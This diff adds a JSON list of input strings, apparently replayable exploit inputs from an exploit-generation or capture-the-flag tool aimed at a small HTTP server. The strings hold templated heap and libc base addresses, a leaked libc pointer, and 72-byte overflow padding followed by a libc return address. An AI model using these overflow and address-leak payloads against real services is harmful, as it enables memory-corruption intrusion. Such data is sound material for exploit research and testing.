@@ -1,0 +1,7 @@
+[
+    "1{{{HEAP_BASE:55383:3:ORI:0:0x6f6857}}} r u?\\n", 
+    "0%3{{{HEAP_BASE:103473:3:ORI:2:0x702431}}}\\n", 
+    "1we{{{HEAP_BASE:54124:3:ORI:2:0x6f636c}}}me!0x{{{LIBC_BASE:133168:12:HEX:10:0x7f9cb934d830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:8:ORI:72:0x7f9cb9372216}}}caaadaaa\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:6:ORI:72:0x7f9cb9372216}}}HTTP/1.1 404{{{HEAP_BASE:48672:3:ORI:200:0x6f4e20}}}t{{{HEAP_BASE:46624:3:ORI:204:0x6f4620}}}und\\r{{{HEAP_BASE:45834:3:ORI:141:0x6f430a}}}ntent-{{{HEAP_BASE:125268:3:ORI:110:0x707954}}}e: text/html; charset=UTF-8\\r{{{HEAP_BASE:45834:3:ORI:141:0x6f430a}}}ntent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page{{{HEAP_BASE:48672:3:ORI:200:0x6f4e20}}}t{{{HEAP_BASE:46624:3:ORI:204:0x6f4620}}}und</h3>"
+]
